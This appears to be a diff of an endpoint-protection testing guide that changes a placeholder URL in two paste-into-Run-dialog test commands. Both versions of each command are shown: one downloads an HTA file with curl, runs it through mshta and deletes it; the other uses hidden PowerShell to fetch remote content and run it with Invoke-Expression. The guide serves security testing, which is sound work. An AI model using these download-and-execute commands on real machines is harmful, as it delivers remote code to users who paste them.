@@ -32,7 +32,7 @@ This method leverages a pasted command that downloads and executes a **Windows H
 To execute this test, log into the machine you wish to test your Endpoint Protection suite on. Preferably, use a non-privileged account to more closely simulate a real-world test. Copy the below command to your clipboard, press `WIN+R` to open the "run" prompt, press `CTRL+V` to paste the command, then `ENTER` to execute.
 
 ```
-cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<your_url.com>/B.max" && mshta "!u!" && del /f "!u!""
+cmd /v:on /c "set "u=%LOCALAPPDATA%\B.max" && curl -s -k -L -o "!u!" "https://<mysite.com>/B.max" && mshta "!u!" && del /f "!u!""
 ```
 
 #### Validation
@@ -65,7 +65,7 @@ This method leverages a PowerShell chain loader to install an application to the
 To execute this test, log into the machine you wish to test your Endpoint Protection suite on. Preferably, use a non-privileged account to more closely simulate a real-world test. Copy the below command to your clipboard, press `WIN+R` to open the "run" prompt, press `CTRL+V` to paste the command, then `ENTER` to execute.
 
 ```
-powershell.exe -NoProfile -WindowStyle hidden -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://<your_url.com>/nexus-validation.txt' -UseBasicParsing).Content)"
+powershell.exe -NoProfile -WindowStyle hidden -Command "Invoke-Expression ((Invoke-WebRequest -Uri 'https://<mysite.com>/nexus-validation.txt' -UseBasicParsing).Content)"
 ```
 
 #### Validation
